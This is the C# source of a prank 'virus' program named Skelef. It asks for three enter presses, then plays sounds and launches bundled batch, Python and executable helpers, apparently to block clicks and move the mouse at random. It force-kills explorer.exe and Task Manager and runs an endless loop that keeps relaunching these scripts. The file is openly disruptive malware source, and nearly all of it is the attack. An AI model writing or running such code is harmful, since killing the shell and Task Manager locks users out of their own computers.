using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.Diagnostics;

namespace Skelef
{

    class Program
    {

        private const int SW_MAXIMIZE = 3;
        private const int SW_MINIMIZE = 6;

        [DllImport("user32.dll", EntryPoint = "FindWindow")]
        public static extern IntPtr FindWindowByCaption(IntPtr ZeroOnly, string lpWindowName);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        static void ASDASDASD()
        {
            string CD_VAR = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

            while (true)
            {
                IntPtr hwnd2 = FindWindowByCaption(IntPtr.Zero, CD_VAR + @"\Skelef.exe");
                ShowWindow(hwnd2, SW_MINIMIZE);
                Thread.Sleep(100);
            }
        }

        static void OMG_SABSICK_REFERENCE()
        {
            Process ExternalProcess3 = new Process();
            string CD_VAR = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

            while (true)
            {
                ExternalProcess3.StartInfo.FileName = CD_VAR + @"\scripts\Sabsick_Reference_min.bat";
                Thread.Sleep(5000);
            }
        }

        static void Main(string[] args)
        {

            
            Console.WriteLine("        !!! WARNING !!!\n");
            Console.WriteLine("       Yknow its a virus\n   press enter 3x to run it...\n");
            Console.ReadLine();
            Console.Clear();
            Console.WriteLine("        !!! WARNING !!!\n");
            Console.WriteLine("       Yknow its a virus\n   press enter 2x to run it...\n");
            Console.ReadLine();
            Console.Clear();
            Console.WriteLine("        !!! WARNING !!!\n");
            Console.WriteLine("       Yknow its a virus\n   press enter 1x to run it...\n");
            string CD_VAR1 = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            Console.WriteLine(CD_VAR1 + @"\scripts\Sabsick_Reference_min.bat");
            Console.WriteLine(CD_VAR1 + @"\scripts\no_click.bat");
            Console.ReadLine();
            Console.Clear();
            Console.WriteLine("Lol Virus start :)\n");


            // The virus part
            

            string CD_VAR = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            int thread = 0;

            Console.WriteLine(CD_VAR + @"\scripts\Sabsick_Reference_min.bat");
            Console.WriteLine(CD_VAR + @"\scripts\no_click.bat");

            System.Media.SoundPlayer thisu = new System.Media.SoundPlayer(CD_VAR + @"\sounds\ahaha.wav");
            thisu.Play();

            Thread.Sleep(3000);

            Process ExternalProcess1 = new Process();
            Process ExternalProcess2 = new Process();
            Process ExternalProcess3 = new Process();
            Process ExternalProcess4 = new Process();

            ExternalProcess4.StartInfo.FileName = CD_VAR + @"\scripts\no_click.bat";
            ExternalProcess2.StartInfo.FileName = CD_VAR + @"\scripts\rand_mousepos.py";
            ExternalProcess1.StartInfo.FileName = CD_VAR + @"\scripts\AHAHAHA.exe";
            ExternalProcess4.Start();
            ExternalProcess1.Start();

            Thread.Sleep(4000);

            System.Media.SoundPlayer bonk = new System.Media.SoundPlayer(CD_VAR + @"\sounds\bonk.wav");
            System.Media.SoundPlayer thub = new System.Media.SoundPlayer(CD_VAR + @"\sounds\aah.wav");
            thub.Play();

            Process.Start("taskkill", "/F /IM explorer.exe");
            Process.Start("taskkill", "/F /IM taskmgr.exe");

            Thread.Sleep(800);
            while (true)
            {
                bonk.Play();
                Thread.Sleep(800);
                thread++;
                if (thread == 5)
                {
                    ExternalProcess3.StartInfo.FileName = CD_VAR + @"\scripts\Sabsick_Reference_min.bat";
                    ExternalProcess3.Start();
                    thread = 0;
                }
                ExternalProcess2.Start();
            }
         
            Console.ReadLine();
        }
        
    }
}
